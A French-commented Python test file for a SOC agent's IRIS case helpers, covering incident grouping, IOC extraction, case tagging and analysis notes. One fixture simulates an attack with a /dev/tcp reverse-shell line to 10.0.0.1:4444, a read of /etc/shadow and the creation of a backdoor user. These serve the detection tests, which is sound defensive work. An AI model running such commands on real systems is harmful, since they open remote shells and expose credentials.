"""Tests des helpers de génération de case IRIS (sans base ni IRIS).

Le formatage des notes et le choix de classification/IOC sont déterministes et
doivent l'être : c'est ce qui atterrit dans le dossier d'incident lu par un
analyste.
"""

from soc_agent.iris import (
    CLASSIF_BRUTE,
    CLASSIF_DEFAUT,
    CLASSIF_RANSOMWARE,
    _apparentes,
    _classification,
    _distincts,
    _iocs,
    _note_fp,
    _note_tp,
    _poser_note,
    _taguer,
    _verdict_a_change,
)


class _FakeConn:
    """conn minimal : renvoie des lignes de triages canned pour execute()."""

    def __init__(self, rows):
        self._rows = rows

    def execute(self, *a, **k):
        return self

    def fetchall(self):
        return self._rows


def _tr(**kw):
    """Ligne de traits d'alerte pour le garde-fou anti-doublon."""
    base = {"srcip": None, "srcuser": None, "entity": None,
            "mitre_tactics": [], "rule_groups": []}
    base.update(kw)
    return base


# --- correctif #1 : ne pas régénérer le rapport LLM si le verdict n'a pas bougé

def test_verdict_a_change_stable_ne_regenere_pas():
    """Deux triages identiques (verdict + actions) -> le rapport ressortirait
    à l'identique, on ne régénère pas (False)."""
    rows = [{"verdict": "true_positive", "actions": ["propose_block_ip", "open_case"]},
            {"verdict": "true_positive", "actions": ["propose_block_ip", "open_case"]}]
    assert _verdict_a_change(_FakeConn(rows), 1) is False


def test_verdict_a_change_verdict_different_regenere():
    rows = [{"verdict": "true_positive", "actions": ["open_case"]},
            {"verdict": "needs_investigation", "actions": ["open_case"]}]
    assert _verdict_a_change(_FakeConn(rows), 1) is True


def test_verdict_a_change_actions_differentes_regenere():
    rows = [{"verdict": "true_positive", "actions": ["propose_isolate_host", "open_case"]},
            {"verdict": "true_positive", "actions": ["open_case"]}]
    assert _verdict_a_change(_FakeConn(rows), 1) is True


def test_verdict_a_change_premier_triage_regenere():
    """Un seul triage (première analyse) : on régénère (True)."""
    assert _verdict_a_change(_FakeConn([{"verdict": "true_positive",
                                         "actions": ["open_case"]}]), 1) is True


def test_section_commandes_ecarte_bruit_session():
    """Le compte compromis est aussi une session légitime : son bruit de login
    (gpg-agent, générateurs systemd), séparé de l'attaque par un silence, ne
    doit PAS apparaître ; seules les commandes rattachées à l'attaque restent."""
    from datetime import datetime, timedelta, timezone
    from soc_agent.iris import _section_commandes
    base = datetime(2026, 7, 25, 14, 0, 0, tzinfo=timezone.utc)

    def al(sec, level, cmd, uid="1001"):
        hexp = cmd.replace(" ", "\x00").encode().hex()
        raw = {"full_log": f"proctitle={hexp}", "data": {"audit": {"uid": uid}}}
        return {"ts": base + timedelta(seconds=sec), "rule_level": level,
                "rule_id": "80792", "rule_desc": "", "rule_groups": [],
                "srcip": None, "srcuser": None, "entity": None, "raw": raw}

    alertes = [
        # Burst d'init de session à t=0..2 (bruit de login sous le même uid).
        al(0, 3, "/bin/bash /usr/lib/systemd/user-environment-generators/90gpg-agent"),
        al(1, 3, "gpgconf --list-options gpg-agent"),
        al(2, 3, "bash -c whoami; id"),
        # Attaque à t=120+ : alerte HIGH (ancre) puis suite immédiate.
        al(120, 12, "timeout 3 bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
        al(124, 3, "sudo cat /etc/shadow"),
        al(130, 3, "sudo useradd -m svcbackup"),
    ]
    sec = _section_commandes(alertes)
    # Attaque présente.
    assert "svcbackup" in sec and "/etc/shadow" in sec and "dev/tcp" in sec
    # Bruit écarté : denylist (gpg-agent) ET cluster détaché (whoami, 118 s avant
    # la première alerte malveillante).
    assert "gpg-agent" not in sec
    assert "whoami" not in sec


def test_distincts_uids_compromis_differents():
    # Deux chaînes simultanées sur le même hôte (uid 1001 vs uid 33/www-data) :
    # identités fortes disjointes -> incidents DISTINCTS, jamais à fondre.
    a = [_tr(audit_uid=1001, mitre_tactics=["Execution"])]
    b = [_tr(audit_uid=33, mitre_tactics=["Execution"])]
    assert _distincts(a, b) is True


def test_non_distincts_sans_identite_forte():
    # Beacons reverse-shell : aucun uid/IP fort -> non distincts, donc éligibles
    # à la fusion si apparentés.
    a = [_tr(audit_uid=None, entity="/usr/bin/bash", mitre_tactics=["Execution"])]
    b = [_tr(audit_uid=None, entity="/usr/bin/dash", mitre_tactics=["Execution"])]
    assert _distincts(a, b) is False


def test_root_ne_distingue_pas():
    # uid 0 (privesc SUID) apparaît partout : ne doit pas séparer deux incidents.
    a = [_tr(audit_uid=0, mitre_tactics=["Execution"])]
    b = [_tr(audit_uid=0, mitre_tactics=["Execution"])]
    assert _distincts(a, b) is False


def test_apparentes_par_tactique_mitre():
    # Lien faible (tactique commune) suffit à établir la parenté.
    a = [_tr(entity="/usr/bin/bash", mitre_tactics=["Execution"],
             rule_groups=["threat_hunting", "linux"])]
    b = [_tr(entity="/usr/bin/dash", mitre_tactics=["Execution"],
             rule_groups=["threat_hunting", "linux"])]
    assert _apparentes(a, b) is True


def test_non_apparentes_traits_disjoints():
    a = [_tr(mitre_tactics=["Execution"], rule_groups=["threat_hunting"])]
    b = [_tr(mitre_tactics=["Impact"], rule_groups=["syscheck_file"])]
    assert _apparentes(a, b) is False


def test_entite_generique_ne_lie_pas():
    # bash/dash partagés ne créent PAS de parenté (sinon toute activité shell
    # fusionnerait). Seuls les objets concrets non génériques comptent.
    a = [_tr(entity="/usr/bin/bash")]
    b = [_tr(entity="/usr/bin/bash")]
    assert _apparentes(a, b) is False


class _Rep:
    """Réponse ApiResponse minimale."""

    def __init__(self, data, ok=True):
        self._data = data
        self._ok = ok

    def is_success(self):
        return self._ok

    def get_data(self):
        return self._data


class FakeCase:
    """Client IRIS factice : enregistre les appels au lieu de les émettre."""

    def __init__(self, tags="", dirs=None):
        self._tags = tags
        self._dirs = dirs if dirs is not None else []
        self.updates = []
        self.notes_ajoutees = []
        self.notes_maj = []
        self.dirs_crees = []

    def get_case(self, case_id):
        return _Rep({"case_tags": self._tags})

    def update_case(self, case_id=None, **kw):
        self.updates.append(kw)
        return _Rep({"case_id": case_id})

    def list_notes_directories(self, cid=None):
        return _Rep(self._dirs)

    def update_note(self, note_id=None, note_content=None, cid=None):
        self.notes_maj.append((note_id, note_content))
        return _Rep({"note_id": note_id})

    def add_notes_directory(self, directory_name=None, cid=None):
        self.dirs_crees.append(directory_name)
        return _Rep({"id": 99})

    def add_note(self, note_title=None, note_content=None, directory_id=None, cid=None):
        self.notes_ajoutees.append((note_title, directory_id, note_content))
        return _Rep({"note_id": 1})

TRIAGE_FP = {"verdict": "false_positive", "confidence": "high",
             "reason": "Fichier de test EICAR déposé par l'équipe.",
             "mitre": None, "actions": []}


def test_note_fp_avec_exception():
    regle = {"match_all": {"rule_id": "87105", "file": "/tmp/eicar.com"},
             "reason": "FP récurrent", "source": "auto", "active": True}
    note = _note_fp(TRIAGE_FP, regle)
    assert "Faux positif" in note
    assert "EICAR" in note
    assert "active" in note
    assert "/tmp/eicar.com" in note          # l'exception est explicitée


def test_note_fp_sans_exception():
    note = _note_fp(TRIAGE_FP, None)
    assert "Pas encore d'exception" in note


def test_classification_ransomware():
    inc = {"mitre_tactics": ["Impact"]}
    alertes = [{"rule_groups": ["ransomware", "linux"]}]
    assert _classification(inc, alertes) == CLASSIF_RANSOMWARE


def test_classification_brute_force():
    inc = {"mitre_tactics": []}
    alertes = [{"rule_groups": ["authentication_failed"]}]
    assert _classification(inc, alertes) == CLASSIF_BRUTE


def test_classification_defaut():
    assert _classification({"mitre_tactics": []}, [{"rule_groups": ["ossec"]}]) \
        == CLASSIF_DEFAUT


def test_iocs_dedupliques_et_types():
    import json
    vt = {"found": "62", "malicious": "48", "source": {"sha256": "abc",
                                                       "file": "/tmp/x"}}
    alertes = [
        {"srcip": "45.134.26.87", "entity": "/tmp/x",
         "raw": json.dumps({"data": {"virustotal": vt}})},
        {"srcip": "45.134.26.87", "entity": "/tmp/x",   # doublon
         "raw": json.dumps({"data": {}})},
    ]
    iocs = _iocs(alertes)
    valeurs = {v for v, _, _ in iocs}
    types = {t for _, t, _ in iocs}
    # Dédupliqué : l'IP et le chemin n'apparaissent qu'une fois malgré deux
    # alertes ; le fichier signalé par VT est porté par son hash.
    assert valeurs == {"45.134.26.87", "/tmp/x", "abc"}
    assert "ip-any" in types and "sha256" in types


def test_iocs_ignore_verdict_vt_non_malveillant():
    """Un hash que VirusTotal ne connaît même pas n'est pas un indicateur de
    compromission. Observé à un exercice purple-team : deux des trois IOC d'un
    case étaient des `found=0, malicious=0` étiquetés « signalé par VirusTotal »."""
    import json
    raw = json.dumps({"data": {"virustotal": {
        "found": "0", "malicious": "0",
        "source": {"sha1": "3f35b3515a5aeff3998b084846c4d37aa0fb9233",
                   "file": "C:\\\\Temp\\\\x.exe"}}}})
    assert _iocs([{"srcip": None, "entity": None, "raw": raw}]) == []


def test_iocs_ignore_les_cles_de_registre():
    """L'intégration VT suit aussi le FIM du registre : une clé n'a pas de
    contenu analysable, et le hash qui l'accompagne ne désigne aucun binaire."""
    import json
    raw = json.dumps({"data": {"virustotal": {
        "found": "5", "malicious": "3",
        "source": {"sha1": "deadbeef",
                   "file": "HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet"
                           "\\\\Services\\\\bam\\\\State"}}}})
    assert _iocs([{"srcip": None, "entity": None, "raw": raw}]) == []


def test_iocs_capte_lexecutable_windows_depose():
    """mimikatz.exe manquait aux IOC d'un case alors qu'il était cité par une
    dizaine d'alertes — et son absence empêchait aussi la fusion de campagne
    entre les deux hôtes qui l'exécutaient."""
    import json
    chemin = r"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\mimikatz\\x64\\mimikatz.exe"
    raw = json.dumps({"data": {"win": {"system": {"eventID": "1"},
                                       "eventdata": {"image": chemin}}}})
    valeurs = {v for v, _, _ in _iocs([{"srcip": None, "entity": None,
                                        "raw": raw}])}
    assert valeurs == {chemin.replace("\\\\", "\\")}


def _alerte_auditd(execve: dict, proctitle: str = "", exe: str = "/usr/bin/sh",
                   fichier: str | None = None) -> dict:
    """Alerte auditd telle que la stocke l'ingest : le champ `entity` et
    `audit.file.name` portent le binaire chargé, jamais l'argument."""
    import json
    full_log = ""
    if proctitle:
        full_log = "type=PROCTITLE proctitle=" + proctitle.encode().hex()
    data = {"audit": {"execve": execve, "exe": exe,
                      "file": {"name": fichier or exe}}}
    return {"srcip": None, "entity": exe,
            "raw": json.dumps({"data": data, "full_log": full_log})}


def test_iocs_capte_le_fichier_cite_en_argument():
    """`insmod /tmp/ironveil.ko` et `python3 /tmp/.cache-update.py` ne
    produisaient aucun IOC : auditd met le binaire chargé par le noyau dans
    `audit.exe`/`entity` (/usr/bin/kmod, /usr/bin/python3) et l'artefact déposé
    reste dans l'argv. Case #207 du 2026-08-11, rootkit non indexé."""
    alertes = [
        _alerte_auditd({"a0": "insmod", "a1": "/tmp/ironveil.ko"},
                       exe="/usr/bin/kmod", fichier="/etc/hosts"),
        _alerte_auditd({"a0": "python3", "a1": "/tmp/.cache-update.py",
                        "a2": "--id"}, exe="/usr/bin/python3"),
    ]
    valeurs = {v for v, _, _ in _iocs(alertes)}
    assert valeurs == {"/tmp/ironveil.ko", "/tmp/.cache-update.py"}
    assert all(t == "filename" for _, t, _ in _iocs(alertes))


def test_iocs_argv_replie_sur_le_proctitle():
    """Sans champ `execve` décodé, le proctitle hex reste la seule source."""
    alertes = [_alerte_auditd({}, proctitle="insmod /dev/shm/.k.ko",
                              exe="/usr/bin/kmod")]
    assert {v for v, _, _ in _iocs(alertes)} == {"/dev/shm/.k.ko"}


def test_iocs_argv_ignore_les_chemins_systeme_et_la_machinerie_tmp():
    """Un argument légitime n'est pas un IOC : ni les binaires/config système,
    ni les montages privés systemd et sockets X11, qui vivent dans /tmp sans
    rien devoir à l'attaquant."""
    alertes = [
        _alerte_auditd({"a0": "cat", "a1": "/etc/passwd"}, exe="/usr/bin/cat"),
        _alerte_auditd({"a0": "systemd-tmpfiles", "a1": "--clean",
                        "a2": "/tmp/systemd-private-abc/tmp"},
                       exe="/usr/bin/systemd-tmpfiles"),
        _alerte_auditd({"a0": "ls", "a1": "/tmp/.X11-unix"}, exe="/usr/bin/ls"),
    ]
    assert _iocs(alertes) == []


def test_iocs_argv_dedup_avec_le_chemin_deja_vu():
    """Le même fichier vu par l'argv et par le FIM sans hash ne fait qu'un IOC."""
    import json
    argv = _alerte_auditd({"a0": "python3", "a1": "/tmp/.implant.py"},
                          exe="/usr/bin/python3")
    fim = {"srcip": None, "entity": None,
           "raw": json.dumps({"syscheck": {"path": "/tmp/.implant.py"}})}
    assert len(_iocs([argv, fim])) == 1


def test_iocs_argv_laisse_passer_le_hash_du_meme_fichier():
    """Le chemin vu dans l'argv ne doit pas masquer le HASH du même fichier
    publié ensuite par le FIM : le hash survit au renommage et vaut sur tout le
    parc, c'est la valeur la plus utile des deux."""
    import json
    argv = _alerte_auditd({"a0": "python3", "a1": "/tmp/.implant.py"},
                          exe="/usr/bin/python3")
    fim = {"srcip": None, "entity": None,
           "raw": json.dumps({"syscheck": {"path": "/tmp/.implant.py",
                                           "sha256_after": "cafe1234"}})}
    valeurs = {v for v, _, _ in _iocs([argv, fim])}
    assert valeurs == {"/tmp/.implant.py", "cafe1234"}


def test_iocs_epargne_les_binaires_systeme_et_sondes():
    import json

    def alerte(image):
        return {"srcip": None, "entity": None,
                "raw": json.dumps({"data": {"win": {
                    "system": {"eventID": "1"},
                    "eventdata": {"image": image}}}})}

    assert _iocs([alerte(r"C:\\Windows\\System32\\cmd.exe")]) == []
    assert _iocs([alerte(r"C:\\Users\\a\\AppData\\Local\\Temp"
                         r"\\__PSScriptPolicyTest_ab.cd.ps1")]) == []


def test_taguer_ajoute_hostname():
    """Le hostname de la machine touchée devient un tag du case."""
    c = FakeCase(tags="")
    _taguer(c, 5, "endpoint-01")
    assert c.updates == [{"case_tags": ["endpoint-01"]}]


def test_taguer_union_sans_ecraser_ni_dupliquer():
    """On complète les tags existants ; un hostname déjà présent ne rejoue rien."""
    c = FakeCase(tags="prod, endpoint-01")
    _taguer(c, 5, "endpoint-01")            # déjà présent
    assert c.updates == []
    c2 = FakeCase(tags="prod")
    _taguer(c2, 5, "endpoint-01")
    assert c2.updates == [{"case_tags": ["endpoint-01", "prod"]}]


def test_poser_note_met_a_jour_l_existante():
    """Au refresh, la note d'analyse est REMPLACÉE, pas empilée en double."""
    dirs = [{"id": 3, "name": "Analyse IA",
             "notes": [{"id": 7, "title": "Rapport d'analyse"}]}]
    c = FakeCase(dirs=dirs)
    _poser_note(c, 5, "Rapport d'analyse", "nouveau contenu")
    assert c.notes_maj == [(7, "nouveau contenu")]
    assert c.notes_ajoutees == []


def test_poser_note_cree_si_absente():
    c = FakeCase(dirs=[])
    _poser_note(c, 5, "Rapport d'analyse", "contenu")
    assert c.dirs_crees == ["Analyse IA"]
    assert c.notes_ajoutees and c.notes_ajoutees[0][0] == "Rapport d'analyse"


def test_note_tp_fallback_sans_llm(monkeypatch):
    """Si le LLM est injoignable, le case se crée avec la justification du triage."""
    import soc_agent.iris as iris

    def boom(*a, **k):
        raise RuntimeError("LLM down")

    monkeypatch.setattr(iris, "completion", boom)
    # La map d'anonymisation n'a pas besoin de base pour ce test.
    monkeypatch.setattr(iris, "charger_map", lambda *a, **k: {})
    monkeypatch.setattr(iris, "sauver_map", lambda *a, **k: None)

    # Conn factice : seule _section_remediations l'interroge (table mitigations).
    class _Cur:
        def fetchall(self):
            return []

    class _Conn:
        def execute(self, *a, **k):
            return _Cur()

    conn = _Conn()
    triage = {"verdict": "true_positive", "confidence": "high", "mitre": "T1486",
              "reason": "Ransomware confirmé.",
              "actions": ["propose_isolate_host", "open_case"]}
    inc = {"id": 1, "agent_name": "endpoint-01", "agent_id": "001",
           "first_seen": __import__("datetime").datetime(2026, 7, 22),
           "last_seen": __import__("datetime").datetime(2026, 7, 22),
           "alert_count": 3, "max_level": 15, "mitre_tactics": ["Impact"]}
    note = _note_tp(conn, inc, triage, [{"rule_id": "100670", "rule_level": 15,
                                         "ts": __import__("datetime").datetime(2026, 7, 22),
                                         "rule_desc": "canari", "rule_groups": ["ransomware"],
                                         "srcip": None, "srcuser": None,
                                         "entity": "/root/c.docx", "raw": "{}"}])
    assert "Ransomware confirmé" in note           # justification du triage en repli
    assert "Isoler l'hôte" in note                  # action décidée listée
